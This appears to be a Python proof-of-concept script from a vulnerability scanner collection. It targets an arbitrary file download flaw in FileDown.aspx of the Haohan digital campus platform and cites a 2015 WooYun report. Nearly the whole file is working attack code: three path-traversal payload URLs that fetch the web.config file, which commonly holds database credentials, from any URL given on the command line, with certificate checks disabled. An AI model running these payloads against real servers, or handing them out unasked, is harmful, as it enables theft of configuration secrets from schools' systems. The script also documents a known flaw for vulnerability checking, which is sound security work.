#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 皓翰数字化校园平台任意文件下载
referer: http://www.wooyun.org/bugs/wooyun-2015-0103034
author: Lucifer
description: 文件FileDown.aspx中,参数OldName存在任意文件下载。
'''
import sys
import requests
import warnings
from termcolor import cprint

class haohan_FileDown_filedownload_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/IneduPortal/Components/news/FileDown.aspx?OldName=web.config&NewName=../web.config",
                    "/Inedu3In1/Components/news/FileDown.aspx?OldName=web.config&NewName=../../../web.config",
                    "/IneduBlog/Components/news/FileDown.aspx?OldName=web.config&NewName=../../../web.config"]
        for payload in payloads:
            try:
                vulnurl = self.url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if req.headers["Content-Type"] == "application/xml":
                    cprint("[+]存在皓翰数字化校园平台任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")

            except:
                cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = haohan_FileDown_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()